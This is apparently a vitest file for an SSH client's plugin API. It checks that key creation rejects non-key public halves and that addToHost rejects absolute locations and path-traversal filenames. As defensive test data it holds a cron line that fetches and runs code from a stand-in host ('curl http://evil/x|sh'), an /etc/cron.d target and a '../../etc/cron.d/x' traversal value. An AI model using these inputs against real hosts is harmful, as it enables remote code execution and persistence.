import { describe, it, expect, beforeEach, vi } from "vitest";
import { createHostPluginAPI } from "./runtime";
import { saveKey } from "@/services/keys";
import { storeSecret } from "@/services/vault";
import { sshExecCommand } from "@/services/ssh";
import { useConnectionStore } from "@/stores/connectionStore";

vi.mock("@/services/keys", () => ({
  listKeys: vi.fn(async () => [{ id: "k1", name: "k", key_type: "ed25519", tags: [] }]),
  saveKey: vi.fn(async () => ({ id: "k1", name: "k", key_type: "ed25519", tags: [] })),
  deleteKey: vi.fn(async () => {}),
}));
vi.mock("@/services/vault", () => ({
  getSecret: vi.fn(async () => "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqW1p3nMuFvR5NHqhkxLQKfDVZ2VYFOxKvL8dW7dSpq user@host"),
  storeSecret: vi.fn(async () => {}),
  deleteSecret: vi.fn(async () => {}),
  getPluginSecret: vi.fn(async () => null),
  storePluginSecret: vi.fn(async () => {}),
  deletePluginSecret: vi.fn(async () => {}),
}));

vi.mock("@/services/connections", () => ({
  listConnections: vi.fn(async () => [{ id: "c1", name: "web", host: "h", port: 22, username: "root", tags: [] }]),
}));
vi.mock("@/services/ssh", () => ({ sshExecCommand: vi.fn(async () => ({ stdout: "", stderr: "", exit_code: 0 })) }));
vi.mock("@/services/credentials", () => ({
  resolveConnectionCredentials: vi.fn(async () => ({ username: "root", privateKey: "pk" })),
}));

const PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqW1p3nMuFvR5NHqhkxLQKfDVZ2VYFOxKvL8dW7dSpq user@host";

beforeEach(() => vi.clearAllMocks());

describe("api.keys.create public-key validation", () => {
  it("refuses a payload public key, storing neither the key nor the secret", async () => {
    // addToHost writes this half into a remote file verbatim; stored unvalidated
    // it is a cron entry or a shell rc line waiting for a deploy.
    const api = createHostPluginAPI("test:keycreate-bad", ["keys:write"]);
    await expect(api.keys.create({}, "PRIVATE", "* * * * * root curl http://evil/x|sh"))
      .rejects.toThrow(/public key/i);
    expect(saveKey).not.toHaveBeenCalled();
    expect(storeSecret).not.toHaveBeenCalled();
  });

  it("stores a real public key", async () => {
    const api = createHostPluginAPI("test:keycreate-good", ["keys:write"]);
    await expect(api.keys.create({}, "PRIVATE", PUB_KEY)).resolves.toMatchObject({ id: "k1" });
    expect(storeSecret).toHaveBeenCalledWith("key:k1:public", PUB_KEY);
  });

  it("still allows a key saved with no public half", async () => {
    const api = createHostPluginAPI("test:keycreate-none", ["keys:write"]);
    await expect(api.keys.create({}, "PRIVATE")).resolves.toMatchObject({ id: "k1" });
    expect(storeSecret).toHaveBeenCalledTimes(1);
  });
});

describe("api.keys.addToHost path validation", () => {
  beforeEach(() => {
    useConnectionStore.setState({
      connections: [{ id: "c1", name: "web", host: "h", port: 22, username: "root", tags: [] } as never],
      teamConnections: {},
    });
  });

  it("refuses an absolute location on the plugin path, which no zod schema guards", async () => {
    // api.keys.addToHost passes location and filename straight to the service;
    // the MCP schema is not on this route.
    const api = createHostPluginAPI("test:addtohost-abs", ["keys:read", "connections:read"]);
    await expect(api.keys.addToHost({
      keyId: "k1", connectionId: "c1", location: "/etc/cron.d", filename: "voltius",
    })).rejects.toThrow(/Location/);
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("refuses a filename containing \"/\" on the plugin path", async () => {
    const api = createHostPluginAPI("test:addtohost-sep", ["keys:read", "connections:read"]);
    await expect(api.keys.addToHost({
      keyId: "k1", connectionId: "c1", location: ".ssh", filename: "../../etc/cron.d/x",
    })).rejects.toThrow(/Filename/);
    expect(sshExecCommand).not.toHaveBeenCalled();
  });

  it("reaches the host for a legitimate destination, so the refusals above are the path rule", async () => {
    const api = createHostPluginAPI("test:addtohost-ok", ["keys:read", "connections:read"]);
    await api.keys.addToHost({ keyId: "k1", connectionId: "c1", location: ".ssh", filename: "authorized_keys" });
    expect(sshExecCommand).toHaveBeenCalled();
  });
});
